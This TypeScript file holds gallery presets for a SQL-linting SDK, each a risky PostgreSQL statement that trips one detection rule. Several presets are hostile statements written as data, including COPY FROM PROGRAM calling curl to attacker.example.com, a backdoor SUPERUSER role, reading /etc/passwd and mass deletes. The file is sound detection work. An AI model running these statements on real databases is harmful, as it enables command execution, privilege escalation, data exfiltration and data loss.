// 15 catch-keyed sample presets for the playground gallery.
//
// Each preset triggers exactly one of the SDK's catches. The ID
// matches the catch code (SQL-001 through SQL-015) so we can pair
// the gallery item with a "click here to see SQL-XXX" affordance.
//
// SQL-014 is default-OFF in the SDK — the sample is included for
// completeness. Visiting it via the gallery toggles SQL-014 on
// before analyzing.

export interface Sample {
  readonly code: string;
  readonly title: string;
  readonly description: string;
  readonly sql: string;
  /** Whether to opt-in to a default-OFF rule for this sample. */
  readonly forceEnable?: string;
}

export const SAMPLES: readonly Sample[] = [
  {
    code: 'SQL-001',
    title: 'Cartesian explosion',
    description: 'Two tables in FROM with no JOIN clause or cross-table predicate.',
    sql: `SELECT a.id, b.id
FROM accounts a, billing b;`,
  },
  {
    code: 'SQL-002',
    title: 'Self-join without disambiguator',
    description: 'Same table joined to itself with no predicate distinguishing the two copies.',
    sql: `SELECT u1.name, u2.name
FROM users u1
JOIN users u2 ON TRUE;`,
  },
  {
    code: 'SQL-003',
    title: 'Unbounded UPDATE',
    description: 'UPDATE with no WHERE clause — every row in the table will be modified.',
    sql: `UPDATE users
SET email = 'rotated@example.com';`,
  },
  {
    code: 'SQL-004',
    title: 'Implicit type coercion',
    description: 'Comparing a column against a literal of an incompatible type.',
    sql: `SELECT id FROM users WHERE id = '42';`,
  },
  {
    code: 'SQL-005',
    title: '= NULL footgun',
    description: 'NULL comparison with `=` always evaluates UNKNOWN; should be `IS NULL`.',
    sql: `SELECT id FROM users
WHERE active = NULL;`,
  },
  {
    code: 'SQL-006',
    title: 'OFFSET without ORDER BY',
    description: 'Pagination based on OFFSET without a stable sort order.',
    sql: `SELECT id FROM events
LIMIT 10 OFFSET 20;`,
  },
  {
    code: 'SQL-007',
    title: 'NOT IN with nullable subquery',
    description: 'NOT IN against a subquery that may return NULL — silently filters everything.',
    sql: `SELECT id FROM users
WHERE id NOT IN (SELECT user_id FROM bans);`,
  },
  {
    code: 'SQL-008',
    title: 'String-concatenation injection risk',
    description:
      'Building SQL by concatenating literals that contain an injection-payload shape. Constant-folded, but the SHAPE is what the rule catches (info severity).',
    sql: `SELECT * FROM users
WHERE name = 'admin' || ' OR 1=1';`,
  },
  {
    code: 'SQL-009',
    title: 'DISTINCT on SELECT *',
    description: 'DISTINCT applied to a star projection — fragile + over-fetches.',
    sql: `SELECT DISTINCT * FROM users;`,
  },
  {
    code: 'SQL-010',
    title: 'Correlated subquery in projection',
    description: 'Per-row subquery in SELECT list — runs once per outer row.',
    sql: `SELECT u.id,
       (SELECT COUNT(*) FROM orders o WHERE o.user_id = u.id) AS n
FROM users u;`,
  },
  {
    code: 'SQL-011',
    title: 'Aggregate without GROUP BY',
    description: 'Mixing aggregate with naked column without a GROUP BY.',
    sql: `SELECT name, COUNT(*)
FROM events;`,
  },
  {
    code: 'SQL-012',
    title: 'Recursive CTE without termination',
    description: 'WITH RECURSIVE missing an obvious base / depth bound.',
    sql: `WITH RECURSIVE chain AS (
  SELECT id, parent FROM nodes
  UNION ALL
  SELECT n.id, n.parent FROM nodes n JOIN chain c ON n.id = c.parent
)
SELECT * FROM chain;`,
  },
  {
    code: 'SQL-013',
    title: 'DROP TABLE — destructive DDL',
    description: 'DROP TABLE is irreversible; almost never the intended op for an AI agent.',
    sql: `DROP TABLE users;`,
  },
  {
    code: 'SQL-014',
    title: 'INSERT/UPDATE without RETURNING (default OFF)',
    description: 'Write without RETURNING — agent has to re-query for the row. Default-OFF rule; the gallery enables it for this sample.',
    sql: `INSERT INTO users (email)
VALUES ('a@b.com');`,
    forceEnable: 'sql-014',
  },
  {
    code: 'SQL-015',
    title: 'SELECT * over-fetch',
    description: 'Bare SELECT * — returns every column; tokens, PII, schema fragility.',
    sql: `SELECT * FROM users;`,
  },
  {
      code: 'SQL-016',
      title: "COPY FROM PROGRAM — server-side RCE",
      description: "COPY ... FROM/TO PROGRAM runs a shell command on the DB server.",
      sql: `COPY users FROM PROGRAM 'curl http://attacker.example.com/data';`,
    },
  {
      code: 'SQL-017',
      title: "CREATE EXTENSION plpython3u — untrusted language",
      description: "Untrusted PL languages (plpython3u, plperlu, plsh) are documented superuser-only RCE primitives.",
      sql: `CREATE EXTENSION plpython3u;`,
    },
  {
      code: 'SQL-018',
      title: "ALTER TABLE DROP COLUMN — schema destruction",
      description: "Dropping a column is irreversible and breaks any downstream consumer of that column.",
      sql: `ALTER TABLE users DROP COLUMN email;`,
    },
  {
      code: 'SQL-019',
      title: "CREATE TRIGGER — hidden side effect",
      description: "Triggers run on every matching row event — easy to install, hard to audit later.",
      sql: `CREATE TRIGGER audit_trigger BEFORE INSERT ON users
FOR EACH ROW EXECUTE FUNCTION log_event();`,
    },
  {
      code: 'SQL-020',
      title: "CREATE OR REPLACE FUNCTION — silent overwrite",
      description: "OR REPLACE silently shadows any pre-existing function with the same signature.",
      sql: `CREATE OR REPLACE FUNCTION audit_check() RETURNS void
AS $$ BEGIN END $$ LANGUAGE plpgsql;`,
    },
  {
      code: 'SQL-021',
      title: "GRANT TO PUBLIC — over-broad permission",
      description: "PUBLIC includes every existing and future role — almost never the intended grantee.",
      sql: `GRANT SELECT ON users TO PUBLIC;`,
    },
  {
      code: 'SQL-022',
      title: "CREATE ROLE … SUPERUSER — privilege escalation",
      description: "SUPERUSER bypasses every permission check; almost never an agent-issued operation.",
      sql: `CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x';`,
    },
  {
      code: 'SQL-023',
      title: "pg_terminate_backend — session-killing DoS",
      description: "Bulk-terminating sessions in pg_stat_activity disconnects every other user.",
      sql: `SELECT pg_terminate_backend(pid)
FROM pg_stat_activity
WHERE pid <> pg_backend_pid();`,
    },
  {
      code: 'SQL-024',
      title: "VACUUM FULL — ACCESS EXCLUSIVE outage",
      description: "VACUUM FULL rewrites the table under an ACCESS EXCLUSIVE lock — an outage on a busy table.",
      sql: `VACUUM FULL users;`,
    },
  {
      code: 'SQL-025',
      title: "REFRESH MATERIALIZED VIEW — blocking refresh",
      description: "Non-concurrent refresh blocks every reader until it finishes — use CONCURRENTLY.",
      sql: `REFRESH MATERIALIZED VIEW user_summary;`,
    },
  {
      code: 'SQL-026',
      title: "MERGE ON 1=1 — cartesian merge",
      description: "A tautological ON clause turns MERGE into an unbounded write across the cross product.",
      sql: `MERGE INTO target USING source
ON 1=1
WHEN MATCHED THEN UPDATE SET col = 'x';`,
    },
  {
      code: 'SQL-027',
      title: "SET search_path attack",
      description: "Putting a user-writable schema before pg_catalog (CVE-2018-1058) lets users shadow built-ins.",
      sql: `SET search_path = attacker_schema, public, pg_catalog;`,
    },
  {
      code: 'SQL-028',
      title: "pg_create_logical_replication_slot — change-stream egress",
      description: "Replication slots stream every change in the DB to whoever connects to them.",
      sql: `SELECT pg_create_logical_replication_slot('slot1', 'pgoutput');`,
    },
  {
      code: 'SQL-029',
      title: "dblink_connect — outbound connection from DB",
      description: "dblink_* and CREATE SERVER open outbound connections from the DB host.",
      sql: `SELECT dblink_connect('host=remote.example.com user=x dbname=y');`,
    },
  {
      code: 'SQL-030',
      title: "pg_read_server_files — server FS read",
      description: "lo_export, pg_read_server_files, pg_read_binary_file, pg_ls_dir all read the DB host filesystem.",
      sql: `SELECT pg_read_server_files('/etc/passwd');`,
    },
  {
      code: 'SQL-031',
      title: "INSERT … ON CONFLICT DO UPDATE — mass overwrite",
      description: "INSERT SELECT with ON CONFLICT DO UPDATE rewrites every conflicting row.",
      sql: `INSERT INTO users (id, email)
SELECT id, 'x' FROM users
ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email;`,
    },
  {
      code: 'SQL-032',
      title: "EXPLAIN ANALYZE DELETE — looks like planning, runs the delete",
      description: "EXPLAIN ANALYZE actually executes the inner statement to gather runtime stats.",
      sql: `EXPLAIN ANALYZE DELETE FROM users;`,
    },
  {
      code: 'SQL-033',
      title: "DO $$ ... $$ — procedural block (body not analyzed)",
      description: "DO bodies contain plpgsql that static analysis does not parse — review manually.",
      sql: `DO $$ BEGIN
  DELETE FROM users;
END $$;`,
    },
  {
      code: 'SQL-034',
      title: "WHERE 1=1 — literal tautology",
      description: "A literal-true WHERE means the operation runs on every row. Almost always a placeholder bug.",
      sql: `DELETE FROM users WHERE 1=1;`,
    },
  {
      code: 'SQL-035',
      title: "UPDATE FROM — cartesian update",
      description: "UPDATE with FROM but no join predicate updates every target row once per FROM-row.",
      sql: `UPDATE users SET status = 'x' FROM orders;`,
    },
  {
      code: 'SQL-036',
      title: "DELETE USING — cartesian delete",
      description: "DELETE with USING but no join predicate removes every target row that crosses with USING.",
      sql: `DELETE FROM users USING orders;`,
    },
];

/**
 * Map from catch code (uppercase) to its preset. Useful for
 * gallery → editor wiring.
 */
export const SAMPLE_BY_CODE: ReadonlyMap<string, Sample> = new Map(
  SAMPLES.map((s) => [s.code, s]),
);
